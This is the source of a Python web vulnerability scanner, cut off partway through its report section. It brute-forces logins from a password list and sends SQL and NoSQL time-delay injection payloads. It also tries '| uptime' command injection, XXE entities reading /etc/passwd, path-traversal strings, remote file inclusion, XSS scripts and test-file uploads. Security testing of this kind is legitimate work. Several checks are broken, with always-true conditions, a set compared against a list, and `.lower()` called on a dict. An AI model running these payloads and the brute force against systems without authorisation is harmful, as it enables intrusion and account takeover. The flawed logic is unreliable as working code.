import requests
import re
import urllib.parse
import urllib.request
from bs4 import BeautifulSoup
import os
import queue
import socket
import ssl
from datetime import datetime
from configparser import ConfigParser

config_object = ConfigParser()
config_object.read("config.ini")


server_list = set()

linux_servers = ["apache", "nginx", "caddy", "openlitespeed", "hiawatha"]
windows_servers = ["IIS"]
mixed_servers = ["nodejs", "lighttpd"]
privilege_data = ["groupID=grp001&orderID=0001", "grpID=2&item=1", "grp=group1", "role=5"]

sql_injection_dict_normal = {}
sql_injection_dict_injected = {}
nosql_injection_dict_normal = {}
nosql_injection_dict_injected = {}


class OtherUser:

    def __init__(self, user, password, url=None):
        self.url = url
        self.session = requests.Session()
        self.http = self.session.post(
            config_object["WEBURL"]["login"],
            data={
                config_object["CREDENTIAL"]["username_field"]: user,
                config_object["CREDENTIAL"]["password_field"]: password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )

    def save_cookies(self, url):
        self.session.get(url)
        session_cookies = self.session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def get_sess_id(self):
        self.session.get(self.url)
        cookie_dict = self.save_cookies(self.url)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                session_id = cookie_dict[key]
                self.session.close()
                return session_id


class LoginTests:
    def __init__(self, user, login_url, pass_file, wrong_username, good_password, certain_wrong_passwd, logout_url):
        self.username = user
        self.password_found = False
        self.login_url = login_url
        self.logged_in = False
        self.pass_file = pass_file
        self.password = None
        self.wrong_un = wrong_username
        self.wrong_passwords = certain_wrong_passwd
        self.credentials_error_vuln = False
        self.good_password = good_password
        self.session = requests.session()
        self.logout_url = logout_url

        self.test_lockout()
        self.test_account_enum()
        self.test_brute_force()

    def brute_force(self):
        with open(config_object["FILE"]["password_dict"], "rb") as f:
            pass_list = f.readlines()
            f.close()
        pass_q = queue.Queue()
        if len(pass_list):
            for passwd in pass_list:
                try:
                    passwd = passwd.decode("utf-8").rstrip()
                    pass_q.put(passwd)
                except Exception as e:
                    print(e)
                    passwd = passwd.decode("latin-1").rstrip()
                    pass_q.put(passwd)

        for pass_word in pass_q.queue:
            http = requests.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: pass_word,
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
            if http.url == config_object["WEBURL"]["index"]:
                self.password = pass_word
                self.password_found = True
                return 1
        return 0

    def account_enumeration(self):
        print("\nChecking for Account Enumeration and Possible Guessable Users...")
        wrong_password_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_password_res_content = str(wrong_password_res.content)
        wrong_username_res = requests.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.wrong_un,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        wrong_username_req_content = str(wrong_username_res.content)
        if wrong_username_req_content != wrong_password_res_content:
            return 1
        return 0

    def get_correct_password(self):
        if self.password_found:
            return self.password
        return False

    def check_login_attempts(self, n):
        self.session = requests.session()
        for i in range(n):
            self.session.post(
                self.login_url,
                data={
                    config_object["CREDENTIAL"]["username_field"]: self.username,
                    config_object["CREDENTIAL"]["password_field"]: self.wrong_passwords[0],
                    config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
                }
            )
        correct_login = self.session.post(
            self.login_url,
            data={
                config_object["CREDENTIAL"]["username_field"]: self.username,
                config_object["CREDENTIAL"]["password_field"]: self.good_password,
                config_object["CREDENTIAL"]["login_field"]: config_object["CREDENTIAL"]["submit_field"]
            }
        )
        if correct_login.url == config_object["WEBURL"]["index"]:
            self.session.post(self.logout_url)
            self.session.close()
            print("\n[!!!!-!!!!] Wrong Password Lock Out Mechanism not triggered after " + str(n) + " times")
            return 1
        return 0

    def test_lockout(self):
        if self.check_login_attempts(int(config_object["TEST"]["lock_out_mechanism_attempts"])):
            print("[!!!!-!!!!] Weak Lockout Mechanism found for a number of invalid password attempts")
        else:
            print("OK! Wrong Password Lock Out Mechanism detected")

    def test_account_enum(self):
        if self.account_enumeration():
            print(
                "\n[!!!!!-!!!!!!] It s possible that the login error message provides useful information about login credentials!"
                " Make sure the error message is the same for any invalid credentials case!"
            )
        else:
            print("OK! No accounts can be enumerated")

    def test_brute_force(self):
        if self.brute_force():
            print("\n\n[!!!!---!!!!] Brute Force attack successful!!" + "\nUsername: " + self.username + "\n" + "Found password: " + self.password + "\n\n")


class Scanner:
    def __init__(self, url, ignored_links):
        self.session = requests.Session()
        self.target_url = url
        self.target_links = []
        self.ignored_links = ignored_links
        self.cookie_list = []
        self.visited = []

    # Utilities ---------@
    def extract_links(self, url):
        response = self.session.get(url)
        return re.findall(
            '(?:href=")(.*?)"',
            str(response.content)
        )

    def spider(self, url=None):
        if url is None:
            url = self.target_url
        extracted_links = self.extract_links(str(url))
        for extracted_link in extracted_links:
            extracted_link = urllib.parse.urljoin(url, extracted_link)
            if "#" in extracted_link:
                extracted_link = extracted_link.split("#")[0]
            if self.target_url in extracted_link and extracted_link not in self.target_links and extracted_link not in self.ignored_links:
                self.target_links.append(extracted_link)
                self.spider(extracted_link)

    def extract_forms(self, url):
        response = self.session.get(url)
        parsed_html = BeautifulSoup(response.content, "html.parser", from_encoding="iso-8859-1")
        return parsed_html.findAll("form")

    def check_response(self, url):
        try:
            if self.session.post(url).status_code == 200:
                return True
            elif self.session.get(url).status_code == 200:
                return True
        except Exception as e:
            if "toomanyredirects" in str(e).lower():
                print("\n[WARN] Got too many redirects from an URL. This can be ignored.")
                pass
            else:
                return False
        return False

    def submit_form(self, form, value, url, files=None):  # needs changing
        action = form.get("action")
        post_url = urllib.parse.urljoin(url, action)
        method = form.get("method")
        inputs_list = form.findAll("input")
        post_data_dict = {}
        for inputs in inputs_list:
            input_name = inputs.get("name")
            input_type = inputs.get("type")
            input_value = inputs.get("value")

            if input_type == "text":
                input_value = value
            post_data_dict[input_name] = input_value
        if method.lower() == "post":
            return self.session.post(post_url, files=files, data=post_data_dict)
        return self.session.get(post_url, params=post_data_dict)

    def save_cookies(self, url, session=None):
        if session is None:
            self.session.get(url)
            session_cookies = self.session.cookies
        else:
            session_cookies = session.cookies
        cookies_dictionary = session_cookies.get_dict()
        return cookies_dictionary

    def check_hidden_path(self, path):
        response = self.session.get(self.target_url + path)
        if response == 200:
            return True
        return False

    def get_headers(self, url):
        return self.session.get(url).headers

    def get_content(self, url, session=None):
        if session is None:
            response = self.session.get(url)
        else:
            response = session.get(url)
        return response

# Get Info
    def fingerprint(self, url):
        global server_list
        header_for_link = self.get_headers(url)
        server_list.add(header_for_link["Server"])

# Vulnerabilities

    # A1:2017-Injection

    def test_sql(self, form, url):
        global sql_injection_dict_injected, sql_injection_dict_normal
        sql_no_payload = ""
        response_wh_payload = self.submit_form(form, sql_no_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        sql_detect_payload = "IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1))," \
                             "SLEEP(0.5))/*'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'|'XOR(IF(SUBSTR(@@version,1,1)<5," \
                             "BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(0.5)))OR'*/"  # detectify https://labs.detectify.com/2013/05/29/the-ultimate-sql-injection-payload/
        response_w_payload = self.submit_form(form, sql_detect_payload, url)
        sql_response_time = response_w_payload.elapsed.total_seconds()

        if sql_response_time > normal_response_time and sql_response_time > 1:
            sql_injection_dict_normal[url] = normal_response_time
            sql_injection_dict_injected[url] = sql_response_time
            return True
        return False

    def test_nosql(self, form, url):
        global nosql_injection_dict_normal, nosql_injection_dict_injected
        no_nosql_payload = ""
        response_wh_payload = self.submit_form(form, no_nosql_payload, url)
        normal_response_time = response_wh_payload.elapsed.total_seconds()
        nosql_detect_payload = "';sleep(5000); ';it=new%20Date();do{pt=new%20Date();}while(pt-it<5000);"  # https://www.objectrocket.com/blog/mongodb/code-injection-in-mongodb/
        response_w_payload = self.submit_form(form, nosql_detect_payload, url)
        nosql_response_time = response_w_payload.elapsed.total_seconds()

        if nosql_response_time > normal_response_time and nosql_response_time > 1:
            nosql_injection_dict_normal[url] = normal_response_time
            nosql_injection_dict_injected[url] = nosql_response_time
            return True
        return False

    def code_exec(self, form, url):
        code_exec_script = "| uptime"
        response = self.submit_form(form, code_exec_script, url)
        return re.findall('\d\d:\d\d:\d\d', str(response.content))

    # A2:2017-Broken Authentication:
    # Above Class(LoginTestsVulns)

    def test_role_definition_cookie(self, url):
        cookie_dict = self.save_cookies(url)
        if "isadmin" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["isAdmin"]).lower() == "true" or\
                    str(cookie_dict.lower()["isAdministrator"]).lower() == "true" or\
                    str(cookie_dict.lower()["admin"]).lower() == "true" or\
                    str(cookie_dict.lower()["administrator"]).lower() == "true":
                return 1
        if "role" in str(cookie_dict).lower():

            if str(cookie_dict.lower()["role"]).lower() == "admin" or\
                    str(cookie_dict.lower()["role"]).lower() == "administrator" or\
                    str(cookie_dict.lower()["role"]).lower() == "manager" or\
                    str(cookie_dict.lower()["role"]).lower() == "auditor" or\
                    str(cookie_dict.lower()["role"]).lower() == "mod":
                return 1
        return 0

    def search_paths(self):
        print("\nScanning for hidden paths...\n")
        with open(config_object["FILE"]["hidden_url_dict"], "r") as file:
            paths = file.read().split("\n")
        for path in paths:
            try:
                if self.target_url + path not in self.visited and\
                        self.target_url + path not in self.ignored_links and\
                        self.target_url + path not in self.target_links and\
                        "logout" not in self.target_url + path:
                    response = self.session.get(self.target_url + path)
                    if response.status_code == 200:
                        link_visited = self.target_url + path
                        self.visited.append(str(link_visited))
            except Exception as e:
                print(e)
                continue
        if self.visited:
            return 1
        return 0

    def test_role_definition_directories(self):
        hidden_dir = []
        for link in self.visited+self.target_links:
            link = link.lower()
            if "/admin" in link or "/administrator" in link or "/mod" in link or "/moderator" in link:
                hidden_dir.append(link)
        if hidden_dir:
            return hidden_dir
        return 0

    def check_session_url(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid=" or "sessionid=" in str(url).lower():
            print("\n[?????-!!!!!]Possible SessionID Hijacking for link:" + url)
            print("\nSearching for proper SessionID storage on cookies...")
            if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
                if not str(cookie_dict.lower()["secure"]) or str(cookie_dict.lower()["httpOnly"]):
                    print("\n[!!!!!-!!!!!!]Cookie Session not secure...(HTTP only)")
                    return True
        return False

    def test_browser_cache_weakness(self, url):
        response = self.session.get(url)
        if "Cache-Control" in str(response.headers):
            if (response.headers["Cache-Control"] != "no-store" and
                response.headers["Cache-Control"] == "no-cache, must-revalidate") or\
                    (response.headers["Cache-Control"] == "no-store" and
                     response.headers["Cache-Control"] != "no-cache, must-revalidate"):
                return False
        return True

    # A3:2017-Sensitive Data Exposure
    # checking certificate...
    def check_tls(self, to_check=None):  # needs change
        try:
            context = ssl.create_default_context()
            with socket.create_connection((self.target_url, 443)) as sockk:
                with context.wrap_socket(sockk, server_hostname=self.target_url) as tlssock:
                    y = getattr(tlssock, to_check)
                    return y()
        except Exception as e:
            print("Something went wrong in checking TLS. Error: ", str(e))
            pass

    def check_tls_version(self):
        print("\nChecking TLS extensions version...")
        try:
            version = self.check_tls("version")
            if version:
                found = True
            else:
                found = False
            legacy_tls = [x.strip() for x in config_object["TLSVERSION"]["tlsversion"].split(',')]
            for legacy in legacy_tls:
                if str(version).lower() == legacy:
                    print(version.lower)
                    print(
                        "[!!!!-!!!!] Found Legacy Version for TLS extension, this version contains cryptographic weaknesses: " + str(
                            version))
            if not found:
                print("[!!!-!!!] Cannot find the version of the TLS extension...")
        except Exception as e:
            print("[!!!-!!!] Cannot find the version of the TLS extension. Error: ", e)
            pass

    def check_tls_validity(self):
        try:
            print("\nChecking Validity of Digital Certificate...")
            sep = " "
            stripped = self.check_tls("getpeercert")["notAfter"].split(sep, -1)[:-1]
            str1 = " "
            good_date = str1.join(stripped)
            date_time_obj = datetime.strptime(good_date, '%b %d %H:%M:%S %Y')
            print("Certificate expires in: ", date_time_obj-datetime.today())
        except Exception as e:
            print("[!!!-!!!] Cannot find validity for the TLS extension. Error: ", e)
            pass

    def check_secure_tag_cookie_sessid(self, url):
        cookie_dict = self.save_cookies(url)
        if "sid" or "sessionid" or "session" or "sessiontoken" or "sessid" in str(cookie_dict).lower():
            if "secure" or not "httponly" not in str(cookie_dict).lower() or not "secure" and "httponly" not in str(cookie_dict).lower():
                return True
        return False

    @staticmethod
    def check_form_action(form):
        action = form.get("action")
        if "http" in action and "https" not in action:
            return True
        return False

    # A4:2017-XML External Entities (XXE) https://blog.cobalt.io/how-to-execute-an-xml-external-entity-injection-xxe-5d5c262d5b16

    def detect_xml(self, url):
        response = self.session.get(url)
        if ".xml" in url.lower() or "?xml" in str(response.text).lower():
            return 1
        return 0

    def inject_xml(self, url):
        list_of_xee = ['<!DOCTYPE test [ <!ENTITY xxe SYSTEM "https://www.google.com"> ]>', '<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>', '<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "https://www.google.com"> %xxe; ]>']
        if self.detect_xml(url):
            for xee in list_of_xee:
                response = self.session.post(url, data=xee)
                if response.url == 'https://www.google.com':
                    return 1
                elif 'root' == str(response.text).lower():
                    return 1
            return 0

    # A5:2017-Broken Access Control
        # Directory Traversal File Include # https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#basic-lfi
    def lfi_script(self, url, script):
        lfi_script = script
        url = url.replace("=", "=" + lfi_script)
        if "root:" in self.get_content(url).text.lower():
            return 1
        return 0

    def rfi_script(self, url, script):
        rfi_script = script
        url = url.replace("=", "=" + rfi_script)
        if self.get_content(url).url != url:
            return 1
        return 0

    def test_lfi_directory_transversal(self, url):
        if self.local_file_inclusion(url):
            return 1
        if "=" in url:
            if server_list in linux_servers or server_list in mixed_servers:
                if self.lfi_script(url, "../../../etc/passwd") or \
                        self.lfi_script(url, "../../../etc/passwd%00") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd") or \
                        self.lfi_script(url, "%252e%252e%252fetc%252fpasswd%00") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd") or \
                        self.lfi_script(url, "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd%00") or \
                        self.lfi_script(url, "....//....//etc/passwd") or \
                        self.lfi_script(url, "..///////..////..//////etc/passwd") or \
                        self.lfi_script(url, "/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd"):
                    return 1
            elif server_list in windows_servers in mixed_servers:
                if self.lfi_script(url, "../") or \
                        self.lfi_script(url, "..\/") or \
                        self.lfi_script(url, "%2e%2e%2f") or \
                        self.lfi_script(url, "%252e%252e%252f") or \
                        self.lfi_script(url, "%c0%ae%c0%ae%c0%af") or \
                        self.lfi_script(url, "%uff0e%uff0e%u2215") or \
                        self.lfi_script(url, "%uff0e%uff0e%u2216") or \
                        self.lfi_script(url, "..././"):
                    return 1
            if self.rfi_script(url, "https://www.google.com/"):
                return 1
        return 0

    def test_cookie_directory_transversal(self, url):
        # self.session.get(url)
        dummy_session = OtherUser(config_object["CREDENTIAL"]["username_2"], config_object["CREDENTIAL"]["known_password_2"]).session
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            dummy_session.cookies.set(key, "../")
            if self.get_content(url, dummy_session).url is not url:
                dummy_session.close()
                return 1
        return 0

        # Bypassing Authorization Schema
        # Horizontal

    def test_bypass_auth(self, url):
        first_user_session_id = None
        second_user_session_id = None
        response_first_user = None
        response_second_user = None
        dummy_user = OtherUser(config_object["CREDENTIAL"]["username_2"],
                               config_object["CREDENTIAL"]["known_password_2"], url)
        dummy_session = dummy_user.session
        dummy_session.get(url)
        cookie_dict = self.save_cookies(url, dummy_session)
        key_list = list(cookie_dict.keys())
        for key in key_list:
            if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                first_user_session_id = cookie_dict[key]
            else:
                return 0

        if first_user_session_id:
            second_user_session_id = dummy_user.get_sess_id()
        if second_user_session_id:
            data = {
                config_object["CREDENTIAL"]["username_field"]: config_object["CREDENTIAL"]["username"]
            }
            response_first_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
            for key in key_list:
                if key.lower() == "sid" or "sessionid" or "session" or "sessiontoken" or "sessid":
                    dummy_session.cookies.set(key, second_user_session_id)
            response_second_user = dummy_session.post(config_object["WEBURL"]["private_info_url"], data=data)
        if response_first_user and response_second_user:
            if str(response_first_user.text) == str(response_second_user.text):
                return 1
        return 0

        # Vertical ~SOON~

        # Special Request Header

    def test_special_req_header(self, url):
        response_wo_headers = self.session.get(url)
        response_w_x_original = self.session.get(url, headers={"X-Original-URL": "/donotexistrandomstring1238123"})
        response_w_x_rewrite = self.session.get(url, headers={"X-Rewrite-URL": "/donotexistrandomstring1238123"})
        if response_wo_headers.status_code == 404 or response_w_x_original.status_code == 404 or response_w_x_rewrite.status_code == 404:
            return 1
        return 0

        # Privilege Escalation

    def test_privilege_escalation(self, url):
        try:
            response = self.session.get(url)
            if "grp" or "group" or "role" in str(response.text).lower() or "grp" or "group" or "role" in response.url.lower():
                for data in privilege_data:
                    response = self.session.post(url, data=data)
                    if response.status_code != 401:
                        return 1
            if "X-Forwarded-For:" in response.headers:
                print("\n[WARN] X-Forwarded-For header present on link: ")
                print(url)
                print("Hackers may change the IP value!")
            return 0
        except Exception as e:
            print(e)
            pass

    # Insecure Direct Object References
    def test_idor(self, url):
        attempts = 0
        sub_string = re.findall('[?](.*)[=]*\d', url)
        if sub_string:
            index_from_url = int(str(re.findall('\d', str(sub_string))))
            response = self.session.get(url)
            while attempts < 10:
                try:
                    url.replace(str(index_from_url), index_from_url + 1)
                    response_2 = self.session.get(url)
                    if response != response_2 and str(response_2.status_code).startswith("2"):
                        return 1
                except Exception as e:
                    print(e)
                    index_from_url += 1
                    attempts += 1
        return 0
    # A6:2017-Security Misconfiguration
    # Test File Extensions Handling for Sensitive Information
    # Present Extensions (analize robots.txt)

    def search_extensions_robots(self):  # https://github.com/danielmiessler/RobotsDisallowed/blob/master/top1000.txt
        f = open("robots.txt", "r")
        potential_display = []
        unwanted_display_of_url = []
        dir_list = [line.strip() for line in f.readlines()]
        robots_url = str(config_object["WEBURL"]["target"]) + "/robots.txt"
        req_robots = self.session.get(robots_url)
        robots_urls = re.findall('(?:Disallow: )(.*)', req_robots.text)
        print("\nThese are the directories ignored by search engines:")
        if not len(robots_urls) <= 3:
            print(*robots_urls, sep="\n")
        else:
            print("No directories found inside robots.txt")
            return
        print("\nTesting for something interesting...")
        for item in dir_list:
            if item in robots_urls:
                potential_display.append(item)
            check_disallow_url = str(config_object["WEBURL"]["target"]) + str(item)
            if self.check_response(check_disallow_url):
                unwanted_display_of_url.append(check_disallow_url)
        if potential_display:
            print("\nPotential display of sensitive information found in robots.txt: ")
            print(*potential_display, sep="\n")
        if unwanted_display_of_url:
            print("\nGot OK response from the following URLs. Sensitive information might be revealed. Manual check needed: ")
            print(*unwanted_display_of_url, sep="\n")
        if not potential_display or not unwanted_display_of_url:
            print("Nothing interesting found on robots.txt. It may be empty.")

    # Form present extensions

    @staticmethod
    def check_forms_files(form):
        action = form.get("action")
        if "." in action and '/' not in action and '\\' not in action:
            inputs_list = form.findAll("input")
            for inputs in inputs_list:
                input_type = inputs.get("type")
                if str(input_type).lower() == "hidden":
                    return True
        return False

    # File Upload Vulnerability Extension

    @staticmethod  # creates unharmful files
    def create_file_dir(subdir):
        filenames = ["filefortest.php", "fIleForTest.Php.JpEG", "fiL3ForTest.hTMl.JPG", "shell.phPWND", "fIleForTest.eXe.jsp"]
        here = os.path.dirname(os.path.realpath(__file__))
        if not os.path.exists(os.path.join(here, subdir)):
            os.mkdir(os.path.join(here, subdir))
        for filename in filenames:
            if not os.path.isfile("./" + filename):
                filepath = os.path.join(here, subdir, filename)
                test_file = open(filepath, 'w+')
                test_file.write("This is unharmful content to be uploaded to the site")
                test_file.close()

    def file_upload(self, form, url):
        is_file = False
        inputs_list = form.find_all("input")
        for inputs in inputs_list:
            if inputs.get("type").lower() == "file":
                is_file = True
        if is_file is True:
            self.create_file_dir("Files")
            cur_path = os.path.join(os.path.dirname(__file__), 'Files')
            dir_listing = os.listdir(cur_path)
            os.chdir(cur_path)
            for i in dir_listing:
                path_for_file = os.path.relpath('..\\Files\\' + i, cur_path)
                f = open(path_for_file, 'rb')
                files = {'uploaded': f}
                if self.submit_form(form, "value", url, files).status_code == 200:
                    return True
            return False

    def test_xss_in_link(self, url):
        xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
        url = url.replace("=", "=" + xss_test_script)
        response = self.session.get(url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    def test_xss_in_form(self, form, url):
        xss_test_script = "<sCriPt>alert('test')</sCRiPt>"
        response = self.submit_form(form, xss_test_script, url)
        return xss_test_script.lower() in str(response.text) or xss_test_script in str(response.text)

    def local_file_inclusion(self, url):
        lfi_script = "~"
        url = url.replace("=", "=" + lfi_script)
        if self.check_response(url):
            return True
        return False

    # MISC

    def hidden_paths(self):
        if self.search_paths():
            print("Possible Hidden Paths Found:")
            print(*self.visited, sep="\n")

    def admin_directories(self):
        links_admin_path = []
        has_admin_directories = self.test_role_definition_directories()
        if has_admin_directories:
            print("\n[!!!!---?????] Possible Admin Path discovered for links:")
            for link in has_admin_directories:
                links_admin_path.append(link)

    def create_return_merge_links(self):
        visible_links = len(self.target_links)
        invisible_links_length = len(self.visited)
        print("\nVisible Links Length:", visible_links, "\nHidden Links Length:", invisible_links_length)
        final_list = self.target_links + self.visited
        print("\n[?!?!?!--?!?!?!?!] Testing now for NOT hidden links...\n")
        return visible_links, final_list

    # RUNNER

    def run_scanner(self):
        session_id = ""
        prev_session_id = ""

        links_potential_role_definition = []
        links_vulnerable_to_lfi = []
        links_without_secure_cookie_with_sessid = []
        links_browser_cache_weakness = []
        links_lfi_directory_transversal = []
        links_cookie_directory_transversal = []
        links_bypass_authorization = []
        links_special_header = []
        links_xee_vuln = []
        links_xss_link = []
        links_privilege_escal = []
        links_idor = []

        links_forms_dict_xss = {}
        links_forms_dict_file_upload = {}
        links_forms_dict_code_exec = {}
        links_forms_dict_sql_injection = {}
        links_forms_dict_nosql_injection = {}
        links_forms__dict_sensitive_info = {}
        links_forms_files_in_form = {}

        self.check_tls_version()
        self.check_tls_validity()
        self.spider()
        self.hidden_paths()
        self.admin_directories()

        visible_links, final_list = self.create_return_merge_links()

        for count, link in enumerate(final_list):
            try:
                if count-1 == visible_links:
                    print("\n[?!?!?!?!--?!?!?!?!?!] Testing now for HIDDEN links...\n")

                print("[+] Testing " + link)
                self.fingerprint(link)

                if self.test_browser_cache_weakness(link):
                    links_browser_cache_weakness.append(link)

                if self.check_secure_tag_cookie_sessid(link):
                    links_without_secure_cookie_with_sessid.append(link)

                if self.inject_xml(link):
                    links_xee_vuln.append(link)

                if self.test_role_definition_cookie(link):
                    links_potential_role_definition.append(link)

                if self.test_lfi_directory_transversal(link):
                    links_lfi_directory_transversal.append(link)

                if self.test_cookie_directory_transversal(link):
                    links_cookie_directory_transversal.append(link)

                # if self.test_bypass_auth(link): # cant be tested yet
                #     links_bypass_authorization.append(link)

                if self.test_special_req_header(link):
                    links_special_header.append(link)

                if self.test_privilege_escalation(link):
                    links_privilege_escal.append(link)

                if "=" in link:
                    if self.test_xss_in_link(link):
                        links_xss_link.append(link)

                    if self.local_file_inclusion(link):
                        links_vulnerable_to_lfi.append(link)

                    if "sid=" in str(link).lower():
                        session_id = link.split("sid=", 1)[1]
                    elif "sessionid=" in str(link).lower():
                        session_id = link.split("sessionid=", 1)[1]

                    if session_id != prev_session_id:
                        if self.check_session_url(link):
                            prev_session_id = session_id
                            print("\n[!!!!!!-!!!!!!]SessionID Hijack Vulnerability found")

                    if self.test_idor(link):
                        links_idor.append(link)

                forms = self.extract_forms(link)
                for form in forms:
                    print("[+] Testing form in " + link)
                    if self.test_xss_in_form(form, link):
                        links_forms_dict_xss[link] = form

                    if self.file_upload(form, link):
                        links_forms_dict_file_upload[link] = form

                    if self.code_exec(form, link):
                        links_forms_dict_code_exec[link] = form

                    if self.test_sql(form, link):
                        links_forms_dict_sql_injection[link] = form

                    if self.test_nosql(form, link):
                        links_forms_dict_nosql_injection[link] = form

                    if self.check_form_action(form):
                        links_forms__dict_sensitive_info[link] = form

                    if self.check_forms_files(form):
                        links_forms_files_in_form[link] = form

            except Exception as e:
                print(e)
                continue
        self.search_extensions_robots()
        print("\n[@@@]              REPORT                 [@@@]\n")

        # Non-Form Vulnerabilities

        if server_list:
            print("\nServer/s Found: ")
            print(*server_list, sep="\n")

        if not links_potential_role_definition:
            print("\n\n[???---???] Possible non-existing cookies with role storage...")
        else:
            print("\n[!!!!---???] Possible Role Definition Vulnerability on Cookies for links:\n")
            print(*links_potential_role_definition, sep="\n")
            print("[END] End of Role Definition Vulnerable links")

        if links_without_secure_cookie_with_sessid:
            print("\n[!!!!---!!!!] Session ID Set in Cookie but cookie is not secure. It can be sent over unencrypted channels (HTTP) Links:\n")
            print(*links_without_secure_cookie_with_sessid, sep="\n")
            print("[END] End of Insecure Cookie With Session ID SET")

        if links_privilege_escal:
            print("\n[!!!!---!!!!] Application is vulnerable to Vertical Privilege Escalation on links:\n")
            print(*links_privilege_escal, sep="\n")
            print("[END] End of Vertical Privilege Escalation vulnerable links")

        if links_browser_cache_weakness:
            print("\n[!!!!---!!!!] Browser Cache Weakness Vulnerability on links:\n")
            print(*links_browser_cache_weakness, sep="\n")
            print("[END] End of Browser Cache Weakness Vulnerability")

        if links_vulnerable_to_lfi:
            print("\n[!!!!---!!!!] Local File Inclusion Vulnerability on links:\n")
            print(*links_vulnerable_to_lfi, sep="\n")
            print("[END] End of Local File Inclusion")

        if links_lfi_directory_transversal:
            print("\n[!!!!---!!!!] Local File Inclusion Directory Transversal on links:\n")
            print(*links_lfi_directory_transversal, sep="\n")
            print("[END] End of Local File Inclusion Directory Transversal")

        if links_cookie_directory_transversal:
            print("\n[!!!!---!!!!] Cookies Local File Inclusion Directory Transversal  on links:\n")
            print(*links_cookie_directory_transversal, sep="\n")
            print("[END] End of Cookie Local File Inclusion Directory Transversal")

        if links_bypass_authorization:
            print("\n[!!!!---!!!!] Bypassing Authorization Vulnerability:\n")
            print("Horizontal Bypassing Authorization on links:\n")
            print(*links_bypass_authorization, sep="\n")

        if links_special_header:
            print("[!!!!---!!!!] Special Request Header Handling on links:\n")
            print(*links_special_header, sep="\n")
            print("[END] End of Bypassing Authorization Vulnerability")

        if links_xee_vuln:
            print("\n[!!!!---!!!!] XEE Vulnerability found on links:\n")
            print(*links_xee_vuln, sep="\n")
            print("[END] End of XEE Vulnerable links")

        if links_xss_link:
            print("\n[!!!!---!!!!] XSS Vulnerability found on links:\n")
            print(*links_xss_link, sep="\n")
            print("[END] End of XSS Vulnerable links")

        if links_idor:
            print("\n[!!!!---!!!!] Insecure Direct Object References on links:\n")
            print(*links_idor, sep="\n")
            print("[END] IDOR Links")

        # Form Dependent Vulnerabilities

        print("\n[++]       Form Vulnerabilities       [++]\n")

        if links_forms_dict_xss:
            print("\n[!!!!---!!!!] XSS Vulnerabilities found:\n")
            for link in links_forms_dict_xss:
                print("Link:", link, "\nForm:\n", links_forms_dict_xss[link])
                print("------")

        if links_forms_dict_file_upload:
            print("\n[!!!!---!!!!] File Upload Vulnerabilities found:\n")
            for link in links_forms_dict_file_upload:
                print("Link:", link, "\nForm:\n", links_forms_dict_file_upload[link])
                print("------")

        if links_forms_dict_code_exec:
            print("\n[!!!!---!!!!] Code Execution Vulnerabilities found:\n")
            for link in links_forms_dict_code_exec:
                print("Link:", link, "\nForm:\n", links_forms_dict_code_exec[link])
                print("------")

        if links_forms_dict_sql_injection:
            print("\n[!!!!---!!!!] SQL Injection Vulnerabilities found:\n")
            for link in links_forms_dict_sql_injection:
                print("Link:", link, "\nForm:\n", links_forms_dict_sql_injection[link])
                print("[TIME]")
                print("Without SQL Payload: ", sql_injection_dict_normal[link], "s")
                print("With SQL Payload injected: ", sql_injection_dict_injected[link], "s")
                print("------")

        if links_forms_dict_nosql_injection:
            print("\n[!!!!---!!!!] NOSQL Injection Vulnerabilities found:\n")
            for link in links_forms_dict_nosql_injection:
                print("Link:", link, "\nForm:\n", links_forms_dict_nosql_injection[link])
                print("[TIME]")
                print("Without SQL Payload: ", nosql_injection_dict_normal[link], "s")
                print("With SQL Payload injected: ", nosql_injection_dict_injected[link], "s")
                print("------")

        if links_forms__dict_sensitive_info:
            print("\n[!!!!---!!!!] Sensitive Information might be transferred over unsecure form:\n")
            for link in links_forms__dict_sensitive_info:
                print("Link:", link, "\nForm:\n", links_forms__dict_sensitive_info[link])
                print("------")

        if links_forms_files_in_form:
            print("\n[!!!!---!!!!] Sensitive Information might be referenced in hidden form action:\n")
            for link in links_forms_files_in_form:
